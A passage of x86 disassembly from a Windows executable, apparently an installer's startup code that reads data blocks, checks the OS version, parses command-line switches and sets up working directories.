  4032b5:	b8 50 a0 40 00       	mov    $0x40a050,%eax
  4032ba:	eb 51                	jmp    0x40330d
  4032bc:	6a 01                	push   $0x1
  4032be:	e8 82 fd ff ff       	call   0x403045
  4032c3:	59                   	pop    %ecx
  4032c4:	eb ef                	jmp    0x4032b5
  4032c6:	f6 45 d8 01          	testb  $0x1,-0x28(%ebp)
  4032ca:	89 35 10 47 43 00    	mov    %esi,0x434710
  4032d0:	8b 06                	mov    (%esi),%eax
  4032d2:	a3 18 47 43 00       	mov    %eax,0x434718
  4032d7:	74 06                	je     0x4032df
  4032d9:	ff 05 1c 47 43 00    	incl   0x43471c
  4032df:	6a 08                	push   $0x8
  4032e1:	8d 46 44             	lea    0x44(%esi),%eax
  4032e4:	59                   	pop    %ecx
  4032e5:	83 e8 08             	sub    $0x8,%eax
  4032e8:	01 30                	add    %esi,(%eax)
  4032ea:	49                   	dec    %ecx
  4032eb:	75 f8                	jne    0x4032e5
  4032ed:	6a 01                	push   $0x1
  4032ef:	57                   	push   %edi
  4032f0:	57                   	push   %edi
  4032f1:	53                   	push   %ebx
  4032f2:	ff 15 34 81 40 00    	call   *0x408134
  4032f8:	89 46 3c             	mov    %eax,0x3c(%esi)
  4032fb:	83 c6 04             	add    $0x4,%esi
  4032fe:	6a 40                	push   $0x40
  403300:	56                   	push   %esi
  403301:	68 20 47 43 00       	push   $0x434720
  403306:	e8 5f 2d 00 00       	call   0x40606a
  40330b:	33 c0                	xor    %eax,%eax
  40330d:	5f                   	pop    %edi
  40330e:	5e                   	pop    %esi
  40330f:	5b                   	pop    %ebx
  403310:	c9                   	leave
  403311:	c2 04 00             	ret    $0x4
  403314:	55                   	push   %ebp
  403315:	8b ec                	mov    %esp,%ebp
  403317:	81 ec 94 00 00 00    	sub    $0x94,%esp
  40331d:	53                   	push   %ebx
  40331e:	56                   	push   %esi
  40331f:	8b 75 14             	mov    0x14(%ebp),%esi
  403322:	57                   	push   %edi
  403323:	8b 7d 10             	mov    0x10(%ebp),%edi
  403326:	89 75 f8             	mov    %esi,-0x8(%ebp)
  403329:	85 ff                	test   %edi,%edi
  40332b:	75 07                	jne    0x403334
  40332d:	c7 45 f8 00 80 00 00 	movl   $0x8000,-0x8(%ebp)
  403334:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  403338:	89 7d f4             	mov    %edi,-0xc(%ebp)
  40333b:	85 ff                	test   %edi,%edi
  40333d:	75 07                	jne    0x403346
  40333f:	c7 45 f4 20 2a 42 00 	movl   $0x422a20,-0xc(%ebp)
  403346:	8b 45 08             	mov    0x8(%ebp),%eax
  403349:	85 c0                	test   %eax,%eax
  40334b:	7c 0e                	jl     0x40335b
  40334d:	8b 0d 58 47 43 00    	mov    0x434758,%ecx
  403353:	03 c8                	add    %eax,%ecx
  403355:	51                   	push   %ecx
  403356:	e8 ea 01 00 00       	call   0x403545
  40335b:	8d 45 14             	lea    0x14(%ebp),%eax
  40335e:	6a 04                	push   $0x4
  403360:	50                   	push   %eax
  403361:	e8 c9 01 00 00       	call   0x40352f
  403366:	85 c0                	test   %eax,%eax
  403368:	0f 84 af 01 00 00    	je     0x40351d
  40336e:	f6 45 17 80          	testb  $0x80,0x17(%ebp)
  403372:	0f 84 50 01 00 00    	je     0x4034c8
  403378:	8b 1d d0 80 40 00    	mov    0x4080d0,%ebx
  40337e:	ff d3                	call   *%ebx
  403380:	83 25 84 d3 40 00 00 	andl   $0x0,0x40d384
  403387:	83 25 80 d3 40 00 00 	andl   $0x0,0x40d380
  40338e:	81 65 14 ff ff ff 7f 	andl   $0x7fffffff,0x14(%ebp)
  403395:	89 45 f0             	mov    %eax,-0x10(%ebp)
  403398:	b8 08 ea 40 00       	mov    $0x40ea08,%eax
  40339d:	c7 05 68 ce 40 00 08 	movl   $0x8,0x40ce68
  4033a4:	00 00 00 
  4033a7:	a3 10 6a 41 00       	mov    %eax,0x416a10
  4033ac:	a3 0c 6a 41 00       	mov    %eax,0x416a0c
  4033b1:	8b 45 14             	mov    0x14(%ebp),%eax
  4033b4:	c7 05 08 6a 41 00 08 	movl   $0x416a08,0x416a08
  4033bb:	6a 41 00 
  4033be:	89 45 08             	mov    %eax,0x8(%ebp)
  4033c1:	0f 8e 5e 01 00 00    	jle    0x403525
  4033c7:	be 00 40 00 00       	mov    $0x4000,%esi
  4033cc:	39 75 14             	cmp    %esi,0x14(%ebp)
  4033cf:	7d 03                	jge    0x4033d4
  4033d1:	8b 75 14             	mov    0x14(%ebp),%esi
  4033d4:	bf 20 ea 41 00       	mov    $0x41ea20,%edi
  4033d9:	56                   	push   %esi
  4033da:	57                   	push   %edi
  4033db:	e8 4f 01 00 00       	call   0x40352f
  4033e0:	85 c0                	test   %eax,%eax
  4033e2:	0f 84 35 01 00 00    	je     0x40351d
  4033e8:	29 75 14             	sub    %esi,0x14(%ebp)
  4033eb:	89 3d 58 ce 40 00    	mov    %edi,0x40ce58
  4033f1:	89 35 5c ce 40 00    	mov    %esi,0x40ce5c
  4033f7:	8b 7d f4             	mov    -0xc(%ebp),%edi
  4033fa:	8b 45 f8             	mov    -0x8(%ebp),%eax
  4033fd:	68 58 ce 40 00       	push   $0x40ce58
  403402:	89 3d 60 ce 40 00    	mov    %edi,0x40ce60
  403408:	a3 64 ce 40 00       	mov    %eax,0x40ce64
  40340d:	e8 fc 36 00 00       	call   0x406b0e
  403412:	85 c0                	test   %eax,%eax
  403414:	89 45 ec             	mov    %eax,-0x14(%ebp)
  403417:	0f 8c a3 00 00 00    	jl     0x4034c0
  40341d:	8b 35 60 ce 40 00    	mov    0x40ce60,%esi
  403423:	2b f7                	sub    %edi,%esi
  403425:	ff d3                	call   *%ebx
  403427:	f6 05 b4 47 43 00 01 	testb  $0x1,0x4347b4
  40342e:	8b f8                	mov    %eax,%edi
  403430:	74 49                	je     0x40347b
  403432:	2b 45 f0             	sub    -0x10(%ebp),%eax
  403435:	3d c8 00 00 00       	cmp    $0xc8,%eax
  40343a:	77 06                	ja     0x403442
  40343c:	83 7d 14 00          	cmpl   $0x0,0x14(%ebp)
  403440:	75 39                	jne    0x40347b
  403442:	8b 45 08             	mov    0x8(%ebp),%eax
  403445:	ff 75 08             	push   0x8(%ebp)
  403448:	2b 45 14             	sub    0x14(%ebp),%eax
  40344b:	6a 64                	push   $0x64
  40344d:	50                   	push   %eax
  40344e:	ff 15 48 81 40 00    	call   *0x408148
  403454:	50                   	push   %eax
  403455:	8d 85 6c ff ff ff    	lea    -0x94(%ebp),%eax
  40345b:	68 1c a2 40 00       	push   $0x40a21c
  403460:	50                   	push   %eax
  403461:	ff 15 2c 82 40 00    	call   *0x40822c
  403467:	83 c4 0c             	add    $0xc,%esp
  40346a:	8d 85 6c ff ff ff    	lea    -0x94(%ebp),%eax
  403470:	50                   	push   %eax
  403471:	6a 00                	push   $0x0
  403473:	e8 cc 21 00 00       	call   0x405644
  403478:	89 7d f0             	mov    %edi,-0x10(%ebp)
  40347b:	85 f6                	test   %esi,%esi
  40347d:	74 35                	je     0x4034b4
  40347f:	83 7d 10 00          	cmpl   $0x0,0x10(%ebp)
  403483:	75 15                	jne    0x40349a
  403485:	56                   	push   %esi
  403486:	ff 75 f4             	push   -0xc(%ebp)
  403489:	ff 75 0c             	push   0xc(%ebp)
  40348c:	e8 d0 2c 00 00       	call   0x406161
  403491:	85 c0                	test   %eax,%eax
  403493:	74 2f                	je     0x4034c4
  403495:	01 75 fc             	add    %esi,-0x4(%ebp)
  403498:	eb 0e                	jmp    0x4034a8
  40349a:	a1 60 ce 40 00       	mov    0x40ce60,%eax
  40349f:	01 75 fc             	add    %esi,-0x4(%ebp)
  4034a2:	29 75 f8             	sub    %esi,-0x8(%ebp)
  4034a5:	89 45 f4             	mov    %eax,-0xc(%ebp)
  4034a8:	83 7d ec 01          	cmpl   $0x1,-0x14(%ebp)
  4034ac:	0f 85 45 ff ff ff    	jne    0x4033f7
  4034b2:	eb 71                	jmp    0x403525
  4034b4:	83 7d 14 00          	cmpl   $0x0,0x14(%ebp)
  4034b8:	0f 8f 09 ff ff ff    	jg     0x4033c7
  4034be:	eb 65                	jmp    0x403525
  4034c0:	6a fc                	push   $0xfffffffc
  4034c2:	eb 5b                	jmp    0x40351f
  4034c4:	6a fe                	push   $0xfffffffe
  4034c6:	eb 57                	jmp    0x40351f
  4034c8:	85 ff                	test   %edi,%edi
  4034ca:	75 3e                	jne    0x40350a
  4034cc:	39 7d 14             	cmp    %edi,0x14(%ebp)
  4034cf:	7e 54                	jle    0x403525
  4034d1:	8b 5d f8             	mov    -0x8(%ebp),%ebx
  4034d4:	39 5d 14             	cmp    %ebx,0x14(%ebp)
  4034d7:	8b 75 14             	mov    0x14(%ebp),%esi
  4034da:	7c 02                	jl     0x4034de
  4034dc:	8b f3                	mov    %ebx,%esi
  4034de:	bf 20 ea 41 00       	mov    $0x41ea20,%edi
  4034e3:	56                   	push   %esi
  4034e4:	57                   	push   %edi
  4034e5:	e8 45 00 00 00       	call   0x40352f
  4034ea:	85 c0                	test   %eax,%eax
  4034ec:	74 2f                	je     0x40351d
  4034ee:	56                   	push   %esi
  4034ef:	57                   	push   %edi
  4034f0:	ff 75 0c             	push   0xc(%ebp)
  4034f3:	e8 69 2c 00 00       	call   0x406161
  4034f8:	85 c0                	test   %eax,%eax
  4034fa:	74 c8                	je     0x4034c4
  4034fc:	01 75 fc             	add    %esi,-0x4(%ebp)
  4034ff:	29 75 14             	sub    %esi,0x14(%ebp)
  403502:	83 7d 14 00          	cmpl   $0x0,0x14(%ebp)
  403506:	7f cc                	jg     0x4034d4
  403508:	eb 1b                	jmp    0x403525
  40350a:	39 75 14             	cmp    %esi,0x14(%ebp)
  40350d:	7d 03                	jge    0x403512
  40350f:	8b 75 14             	mov    0x14(%ebp),%esi
  403512:	56                   	push   %esi
  403513:	57                   	push   %edi
  403514:	e8 16 00 00 00       	call   0x40352f
  403519:	85 c0                	test   %eax,%eax
  40351b:	75 05                	jne    0x403522
  40351d:	6a fd                	push   $0xfffffffd
  40351f:	58                   	pop    %eax
  403520:	eb 06                	jmp    0x403528
  403522:	89 75 fc             	mov    %esi,-0x4(%ebp)
  403525:	8b 45 fc             	mov    -0x4(%ebp),%eax
  403528:	5f                   	pop    %edi
  403529:	5e                   	pop    %esi
  40352a:	5b                   	pop    %ebx
  40352b:	c9                   	leave
  40352c:	c2 10 00             	ret    $0x10
  40352f:	ff 74 24 08          	push   0x8(%esp)
  403533:	ff 74 24 08          	push   0x8(%esp)
  403537:	ff 35 18 a0 40 00    	push   0x40a018
  40353d:	e8 f0 2b 00 00       	call   0x406132
  403542:	c2 08 00             	ret    $0x8
  403545:	6a 00                	push   $0x0
  403547:	6a 00                	push   $0x0
  403549:	ff 74 24 0c          	push   0xc(%esp)
  40354d:	ff 35 18 a0 40 00    	push   0x40a018
  403553:	ff 15 34 81 40 00    	call   *0x408134
  403559:	c2 04 00             	ret    $0x4
  40355c:	56                   	push   %esi
  40355d:	be 00 18 44 00       	mov    $0x441800,%esi
  403562:	56                   	push   %esi
  403563:	e8 05 33 00 00       	call   0x40686d
  403568:	56                   	push   %esi
  403569:	e8 97 29 00 00       	call   0x405f05
  40356e:	85 c0                	test   %eax,%eax
  403570:	75 02                	jne    0x403574
  403572:	5e                   	pop    %esi
  403573:	c3                   	ret
  403574:	56                   	push   %esi
  403575:	e8 14 29 00 00       	call   0x405e8e
  40357a:	56                   	push   %esi
  40357b:	e8 ed 25 00 00       	call   0x405b6d
  403580:	56                   	push   %esi
  403581:	68 00 10 44 00       	push   $0x441000
  403586:	e8 53 2b 00 00       	call   0x4060de
  40358b:	5e                   	pop    %esi
  40358c:	c3                   	ret
  40358d:	81 ec f8 03 00 00    	sub    $0x3f8,%esp
  403593:	55                   	push   %ebp
  403594:	56                   	push   %esi
  403595:	57                   	push   %edi
  403596:	6a 20                	push   $0x20
  403598:	5f                   	pop    %edi
  403599:	33 ed                	xor    %ebp,%ebp
  40359b:	68 01 80 00 00       	push   $0x8001
  4035a0:	89 6c 24 20          	mov    %ebp,0x20(%esp)
  4035a4:	c7 44 24 18 d8 a2 40 	movl   $0x40a2d8,0x18(%esp)
  4035ab:	00 
  4035ac:	89 6c 24 14          	mov    %ebp,0x14(%esp)
  4035b0:	ff 15 a0 80 40 00    	call   *0x4080a0
  4035b6:	8b 35 a4 80 40 00    	mov    0x4080a4,%esi
  4035bc:	8d 44 24 34          	lea    0x34(%esp),%eax
  4035c0:	50                   	push   %eax
  4035c1:	89 6c 24 4c          	mov    %ebp,0x4c(%esp)
  4035c5:	89 ac 24 4c 01 00 00 	mov    %ebp,0x14c(%esp)
  4035cc:	89 ac 24 50 01 00 00 	mov    %ebp,0x150(%esp)
  4035d3:	c7 44 24 38 1c 01 00 	movl   $0x11c,0x38(%esp)
  4035da:	00 
  4035db:	ff d6                	call   *%esi
  4035dd:	85 c0                	test   %eax,%eax
  4035df:	75 38                	jne    0x403619
  4035e1:	8d 44 24 34          	lea    0x34(%esp),%eax
  4035e5:	c7 44 24 34 14 01 00 	movl   $0x114,0x34(%esp)
  4035ec:	00 
  4035ed:	50                   	push   %eax
  4035ee:	ff d6                	call   *%esi
  4035f0:	66 8b 44 24 48       	mov    0x48(%esp),%ax
  4035f5:	8b 4c 24 62          	mov    0x62(%esp),%ecx
  4035f9:	66 2d 53 00          	sub    $0x53,%ax
  4035fd:	83 c1 d0             	add    $0xffffffd0,%ecx
  403600:	66 f7 d8             	neg    %ax
  403603:	1b c0                	sbb    %eax,%eax
  403605:	c6 84 24 4e 01 00 00 	movb   $0x4,0x14e(%esp)
  40360c:	04 
  40360d:	f7 d0                	not    %eax
  40360f:	23 c1                	and    %ecx,%eax
  403611:	66 89 84 24 48 01 00 	mov    %ax,0x148(%esp)
  403618:	00 
  403619:	83 7c 24 38 0a       	cmpl   $0xa,0x38(%esp)
  40361e:	73 06                	jae    0x403626
  403620:	66 83 64 24 42 00    	andw   $0x0,0x42(%esp)
  403626:	8b 44 24 40          	mov    0x40(%esp),%eax
  40362a:	0f b6 4c 24 3c       	movzbl 0x3c(%esp),%ecx
  40362f:	a3 b8 47 43 00       	mov    %eax,0x4347b8
  403634:	33 c0                	xor    %eax,%eax
  403636:	8a 64 24 38          	mov    0x38(%esp),%ah
  40363a:	0f b7 c0             	movzwl %ax,%eax
  40363d:	0b c1                	or     %ecx,%eax
  40363f:	33 c9                	xor    %ecx,%ecx
  403641:	8a ac 24 48 01 00 00 	mov    0x148(%esp),%ch
  403648:	0f b7 c9             	movzwl %cx,%ecx
  40364b:	c1 e0 10             	shl    $0x10,%eax
  40364e:	0b c1                	or     %ecx,%eax
  403650:	0f b6 8c 24 4e 01 00 	movzbl 0x14e(%esp),%ecx
  403657:	00 
  403658:	0b c1                	or     %ecx,%eax
  40365a:	a3 bc 47 43 00       	mov    %eax,0x4347bc
  40365f:	66 81 3d be 47 43 00 	cmpw   $0x600,0x4347be
  403666:	00 06 
  403668:	74 11                	je     0x40367b
  40366a:	55                   	push   %ebp
  40366b:	e8 43 33 00 00       	call   0x4069b3
  403670:	3b c5                	cmp    %ebp,%eax
  403672:	74 07                	je     0x40367b
  403674:	68 00 0c 00 00       	push   $0xc00
  403679:	ff d0                	call   *%eax
  40367b:	be a8 82 40 00       	mov    $0x4082a8,%esi
  403680:	56                   	push   %esi
  403681:	e8 bd 32 00 00       	call   0x406943
  403686:	56                   	push   %esi
  403687:	ff 15 28 81 40 00    	call   *0x408128
  40368d:	8d 74 06 01          	lea    0x1(%esi,%eax,1),%esi
  403691:	80 3e 00             	cmpb   $0x0,(%esi)
  403694:	75 ea                	jne    0x403680
  403696:	6a 0c                	push   $0xc
  403698:	e8 16 33 00 00       	call   0x4069b3
  40369d:	6a 0a                	push   $0xa
  40369f:	e8 0f 33 00 00       	call   0x4069b3
  4036a4:	6a 08                	push   $0x8
  4036a6:	a3 04 47 43 00       	mov    %eax,0x434704
  4036ab:	e8 03 33 00 00       	call   0x4069b3
  4036b0:	3b c5                	cmp    %ebp,%eax
  4036b2:	74 0f                	je     0x4036c3
  4036b4:	6a 1e                	push   $0x1e
  4036b6:	ff d0                	call   *%eax
  4036b8:	85 c0                	test   %eax,%eax
  4036ba:	74 07                	je     0x4036c3
  4036bc:	80 0d bc 47 43 00 80 	orb    $0x80,0x4347bc
  4036c3:	53                   	push   %ebx
  4036c4:	ff 15 38 80 40 00    	call   *0x408038
  4036ca:	55                   	push   %ebp
  4036cb:	ff 15 98 82 40 00    	call   *0x408298
  4036d1:	a3 c0 47 43 00       	mov    %eax,0x4347c0
  4036d6:	55                   	push   %ebp
  4036d7:	8d 84 24 58 01 00 00 	lea    0x158(%esp),%eax
  4036de:	68 b4 02 00 00       	push   $0x2b4
  4036e3:	50                   	push   %eax
  4036e4:	55                   	push   %ebp
  4036e5:	68 28 aa 42 00       	push   $0x42aa28
  4036ea:	ff 15 7c 81 40 00    	call   *0x40817c
  4036f0:	68 bc a2 40 00       	push   $0x40a2bc
  4036f5:	68 00 37 43 00       	push   $0x433700
  4036fa:	e8 c0 2e 00 00       	call   0x4065bf
  4036ff:	ff 15 a8 80 40 00    	call   *0x4080a8
  403705:	bb 00 f0 43 00       	mov    $0x43f000,%ebx
  40370a:	50                   	push   %eax
  40370b:	53                   	push   %ebx
  40370c:	e8 ae 2e 00 00       	call   0x4065bf
  403711:	6a 22                	push   $0x22
  403713:	c7 05 00 47 43 00 00 	movl   $0x400000,0x434700
  40371a:	00 40 00 
  40371d:	5e                   	pop    %esi
  40371e:	8b c3                	mov    %ebx,%eax
  403720:	66 39 35 00 f0 43 00 	cmp    %si,0x43f000
  403727:	75 07                	jne    0x403730
  403729:	8b fe                	mov    %esi,%edi
  40372b:	b8 02 f0 43 00       	mov    $0x43f002,%eax
  403730:	57                   	push   %edi
  403731:	50                   	push   %eax
  403732:	e8 84 27 00 00       	call   0x405ebb
  403737:	50                   	push   %eax
  403738:	ff 15 08 82 40 00    	call   *0x408208
  40373e:	8b c8                	mov    %eax,%ecx
  403740:	89 4c 24 1c          	mov    %ecx,0x1c(%esp)
  403744:	e9 f6 00 00 00       	jmp    0x40383f
  403749:	6a 20                	push   $0x20
  40374b:	5a                   	pop    %edx
  40374c:	66 3b c2             	cmp    %dx,%ax
  40374f:	75 07                	jne    0x403758
  403751:	41                   	inc    %ecx
  403752:	41                   	inc    %ecx
  403753:	66 39 11             	cmp    %dx,(%ecx)
  403756:	74 f9                	je     0x403751
  403758:	66 39 31             	cmp    %si,(%ecx)
  40375b:	89 54 24 10          	mov    %edx,0x10(%esp)
  40375f:	75 06                	jne    0x403767
  403761:	41                   	inc    %ecx
  403762:	89 74 24 10          	mov    %esi,0x10(%esp)
  403766:	41                   	inc    %ecx
  403767:	66 83 39 2f          	cmpw   $0x2f,(%ecx)
  40376b:	0f 85 bb 00 00 00    	jne    0x40382c
  403771:	41                   	inc    %ecx
  403772:	41                   	inc    %ecx
  403773:	66 83 39 53          	cmpw   $0x53,(%ecx)
  403777:	75 18                	jne    0x403791
  403779:	66 8b 41 02          	mov    0x2(%ecx),%ax
  40377d:	66 3b c2             	cmp    %dx,%ax
  403780:	74 05                	je     0x403787
  403782:	66 3b c5             	cmp    %bp,%ax
  403785:	75 0a                	jne    0x403791
  403787:	c7 05 a0 47 43 00 01 	movl   $0x1,0x4347a0
  40378e:	00 00 00 
  403791:	0f b7 05 b6 a2 40 00 	movzwl 0x40a2b6,%eax
  403798:	99                   	cltd
  403799:	0f a4 c2 10          	shld   $0x10,%eax,%edx
  40379d:	c1 e0 10             	shl    $0x10,%eax
  4037a0:	8b f8                	mov    %eax,%edi
  4037a2:	33 f6                	xor    %esi,%esi
  4037a4:	0f b7 05 b4 a2 40 00 	movzwl 0x40a2b4,%eax
  4037ab:	99                   	cltd
  4037ac:	0f b7 15 b0 a2 40 00 	movzwl 0x40a2b0,%edx
  4037b3:	0b f8                	or     %eax,%edi
  4037b5:	0f b7 05 b2 a2 40 00 	movzwl 0x40a2b2,%eax
  4037bc:	c1 e0 10             	shl    $0x10,%eax
  4037bf:	0b c2                	or     %edx,%eax
  4037c1:	99                   	cltd
  4037c2:	0b f0                	or     %eax,%esi
  4037c4:	8b 01                	mov    (%ecx),%eax
  4037c6:	0b fa                	or     %edx,%edi
  4037c8:	3b c6                	cmp    %esi,%eax
  4037ca:	75 1b                	jne    0x4037e7
  4037cc:	8b 41 04             	mov    0x4(%ecx),%eax
  4037cf:	3b c7                	cmp    %edi,%eax
  4037d1:	75 14                	jne    0x4037e7
  4037d3:	66 8b 41 08          	mov    0x8(%ecx),%ax
  4037d7:	66 3d 20 00          	cmp    $0x20,%ax
  4037db:	74 05                	je     0x4037e2
  4037dd:	66 3b c5             	cmp    %bp,%ax
  4037e0:	75 05                	jne    0x4037e7
  4037e2:	83 4c 24 14 04       	orl    $0x4,0x14(%esp)
  4037e7:	0f b7 05 aa a2 40 00 	movzwl 0x40a2aa,%eax
  4037ee:	99                   	cltd
  4037ef:	0f a4 c2 10          	shld   $0x10,%eax,%edx
  4037f3:	c1 e0 10             	shl    $0x10,%eax
  4037f6:	8b f8                	mov    %eax,%edi
  4037f8:	33 f6                	xor    %esi,%esi
  4037fa:	0f b7 05 a8 a2 40 00 	movzwl 0x40a2a8,%eax
  403801:	99                   	cltd
  403802:	0f b7 15 a4 a2 40 00 	movzwl 0x40a2a4,%edx
  403809:	0b f8                	or     %eax,%edi
  40380b:	0f b7 05 a6 a2 40 00 	movzwl 0x40a2a6,%eax
  403812:	c1 e0 10             	shl    $0x10,%eax
  403815:	0b c2                	or     %edx,%eax
  403817:	99                   	cltd
  403818:	0b f0                	or     %eax,%esi
  40381a:	8b 41 fc             	mov    -0x4(%ecx),%eax
  40381d:	0b fa                	or     %edx,%edi
  40381f:	3b c6                	cmp    %esi,%eax
  403821:	75 06                	jne    0x403829
  403823:	8b 01                	mov    (%ecx),%eax
  403825:	3b c7                	cmp    %edi,%eax
  403827:	74 24                	je     0x40384d
  403829:	6a 22                	push   $0x22
  40382b:	5e                   	pop    %esi
  40382c:	ff 74 24 10          	push   0x10(%esp)
  403830:	51                   	push   %ecx
  403831:	e8 85 26 00 00       	call   0x405ebb
  403836:	8b c8                	mov    %eax,%ecx
  403838:	66 39 31             	cmp    %si,(%ecx)
  40383b:	75 02                	jne    0x40383f
  40383d:	41                   	inc    %ecx
  40383e:	41                   	inc    %ecx
  40383f:	66 8b 01             	mov    (%ecx),%ax
  403842:	66 3b c5             	cmp    %bp,%ax
  403845:	0f 85 fe fe ff ff    	jne    0x403749
  40384b:	eb 12                	jmp    0x40385f
  40384d:	66 89 69 fc          	mov    %bp,-0x4(%ecx)
  403851:	83 c1 04             	add    $0x4,%ecx
  403854:	51                   	push   %ecx
  403855:	68 00 f8 43 00       	push   $0x43f800
  40385a:	e8 60 2d 00 00       	call   0x4065bf
  40385f:	8b 3d ac 80 40 00    	mov    0x4080ac,%edi
  403865:	be 00 18 44 00       	mov    $0x441800,%esi
  40386a:	56                   	push   %esi
  40386b:	68 00 04 00 00       	push   $0x400
  403870:	ff d7                	call   *%edi
  403872:	e8 e5 fc ff ff       	call   0x40355c
  403877:	85 c0                	test   %eax,%eax
  403879:	75 63                	jne    0x4038de
  40387b:	68 fb 03 00 00       	push   $0x3fb
  403880:	56                   	push   %esi
  403881:	ff 15 b0 80 40 00    	call   *0x4080b0
  403887:	68 98 a2 40 00       	push   $0x40a298
  40388c:	56                   	push   %esi
  40388d:	e8 49 2d 00 00       	call   0x4065db
  403892:	e8 c5 fc ff ff       	call   0x40355c
  403897:	85 c0                	test   %eax,%eax
  403899:	75 43                	jne    0x4038de
  40389b:	e8 ea 22 00 00       	call   0x405b8a
  4038a0:	85 c0                	test   %eax,%eax
  4038a2:	0f 85 3d 02 00 00    	jne    0x403ae5
  4038a8:	56                   	push   %esi
  4038a9:	68 fc 03 00 00       	push   $0x3fc
  4038ae:	ff d7                	call   *%edi
  4038b0:	68 90 a2 40 00       	push   $0x40a290
  4038b5:	56                   	push   %esi
  4038b6:	e8 20 2d 00 00       	call   0x4065db
  4038bb:	8b 3d b4 80 40 00    	mov    0x4080b4,%edi
  4038c1:	56                   	push   %esi
  4038c2:	68 84 a2 40 00       	push   $0x40a284
  4038c7:	ff d7                	call   *%edi
  4038c9:	56                   	push   %esi
  4038ca:	68 7c a2 40 00       	push   $0x40a27c
  4038cf:	ff d7                	call   *%edi
  4038d1:	e8 86 fc ff ff       	call   0x40355c
  4038d6:	85 c0                	test   %eax,%eax
  4038d8:	0f 84 07 02 00 00    	je     0x403ae5
  4038de:	68 00 10 44 00       	push   $0x441000
  4038e3:	ff 15 44 81 40 00    	call   *0x408144
  4038e9:	ff 74 24 14          	push   0x14(%esp)
  4038ed:	e8 b7 f7 ff ff       	call   0x4030a9
  4038f2:	3b c5                	cmp    %ebp,%eax
  4038f4:	89 44 24 18          	mov    %eax,0x18(%esp)
  4038f8:	0f 85 e7 01 00 00    	jne    0x403ae5
  4038fe:	39 2d 1c 47 43 00    	cmp    %ebp,0x43471c
  403904:	0f 84 93 00 00 00    	je     0x40399d
  40390a:	55                   	push   %ebp
  40390b:	53                   	push   %ebx
  40390c:	e8 aa 25 00 00       	call   0x405ebb
  403911:	8b f8                	mov    %eax,%edi
  403913:	3b fb                	cmp    %ebx,%edi
  403915:	72 4c                	jb     0x403963
  403917:	0f b7 05 76 a2 40 00 	movzwl 0x40a276,%eax
  40391e:	99                   	cltd
  40391f:	0f a4 c2 10          	shld   $0x10,%eax,%edx
  403923:	c1 e0 10             	shl    $0x10,%eax
  403926:	8b e8                	mov    %eax,%ebp
  403928:	0f b7 05 74 a2 40 00 	movzwl 0x40a274,%eax
  40392f:	0f b7 0d 70 a2 40 00 	movzwl 0x40a270,%ecx
  403936:	99                   	cltd
  403937:	0b e8                	or     %eax,%ebp
  403939:	0f b7 05 72 a2 40 00 	movzwl 0x40a272,%eax
  403940:	c1 e0 10             	shl    $0x10,%eax
  403943:	0b c1                	or     %ecx,%eax
  403945:	33 c9                	xor    %ecx,%ecx
  403947:	99                   	cltd
  403948:	0b c8                	or     %eax,%ecx
  40394a:	8b c5                	mov    %ebp,%eax
  40394c:	0b c2                	or     %edx,%eax
  40394e:	8b 17                	mov    (%edi),%edx
  403950:	3b d1                	cmp    %ecx,%edx
  403952:	75 07                	jne    0x40395b
  403954:	8b 57 04             	mov    0x4(%edi),%edx
  403957:	3b d0                	cmp    %eax,%edx
  403959:	74 06                	je     0x403961
  40395b:	4f                   	dec    %edi
  40395c:	4f                   	dec    %edi
  40395d:	3b fb                	cmp    %ebx,%edi
  40395f:	73 ed                	jae    0x40394e
  403961:	33 ed                	xor    %ebp,%ebp
  403963:	3b fb                	cmp    %ebx,%edi
  403965:	c7 44 24 18 e8 a1 40 	movl   $0x40a1e8,0x18(%esp)
  40396c:	00 
  40396d:	72 43                	jb     0x4039b2
  40396f:	66 89 2f             	mov    %bp,(%edi)
  403972:	83 c7 08             	add    $0x8,%edi
  403975:	57                   	push   %edi
  403976:	e8 1b 26 00 00       	call   0x405f96
  40397b:	85 c0                	test   %eax,%eax
  40397d:	0f 84 62 01 00 00    	je     0x403ae5
  403983:	57                   	push   %edi
  403984:	68 00 f8 43 00       	push   $0x43f800
  403989:	e8 31 2c 00 00       	call   0x4065bf
  40398e:	57                   	push   %edi
  40398f:	68 00 00 44 00       	push   $0x440000
  403994:	e8 26 2c 00 00       	call   0x4065bf
  403999:	89 6c 24 18          	mov    %ebp,0x18(%esp)
  40399d:	83 0d ac 47 43 00 ff 	orl    $0xffffffff,0x4347ac
  4039a4:	e8 e8 02 00 00       	call   0x403c91
  4039a9:	89 44 24 20          	mov    %eax,0x20(%esp)
  4039ad:	e9 33 01 00 00       	jmp    0x403ae5
  4039b2:	e8 d3 21 00 00       	call   0x405b8a
  4039b7:	56                   	push   %esi
  4039b8:	89 44 24 28          	mov    %eax,0x28(%esp)
  4039bc:	e8 14 2c 00 00       	call   0x4065d5
  4039c1:	ff 74 24 1c          	push   0x1c(%esp)
  4039c5:	8b f8                	mov    %eax,%edi
  4039c7:	68 00 50 43 00       	push   $0x435000
  4039cc:	e8 ee 2b 00 00       	call   0x4065bf
  4039d1:	66 39 2d 00 f8 43 00 	cmp    %bp,0x43f800
  4039d8:	75 0f                	jne    0x4039e9
  4039da:	68 00 08 44 00       	push   $0x440800
  4039df:	68 00 f8 43 00       	push   $0x43f800
  4039e4:	e8 d6 2b 00 00       	call   0x4065bf
  4039e9:	8d 04 7d 00 18 44 00 	lea    0x441800(,%edi,2),%eax
  4039f0:	c7 44 24 14 01 00 00 	movl   $0x1,0x14(%esp)
  4039f7:	00 
  4039f8:	89 44 24 1c          	mov    %eax,0x1c(%esp)
  4039fc:	bf 00 78 43 00       	mov    $0x437800,%edi
  403a01:	bb 00 80 43 00       	mov    $0x438000,%ebx
  403a06:	89 6c 24 10          	mov    %ebp,0x10(%esp)
  403a0a:	0f b7 6c 24 14       	movzwl 0x14(%esp),%ebp
  403a0f:	55                   	push   %ebp
  403a10:	68 58 a2 40 00       	push   $0x40a258
  403a15:	ff 74 24 24          	push   0x24(%esp)
  403a19:	ff 15 2c 82 40 00    	call   *0x40822c
  403a1f:	a1 10 47 43 00       	mov    0x434710,%eax
  403a24:	83 c4 0c             	add    $0xc,%esp
  403a27:	ff b0 20 01 00 00    	push   0x120(%eax)
  403a2d:	57                   	push   %edi
  403a2e:	e8 c9 2b 00 00       	call   0x4065fc
  403a33:	83 7c 24 24 00       	cmpl   $0x0,0x24(%esp)
  403a38:	56                   	push   %esi
  403a39:	74 07                	je     0x403a42
  403a3b:	e8 d3 20 00 00       	call   0x405b13
  403a40:	eb 05                	jmp    0x403a47
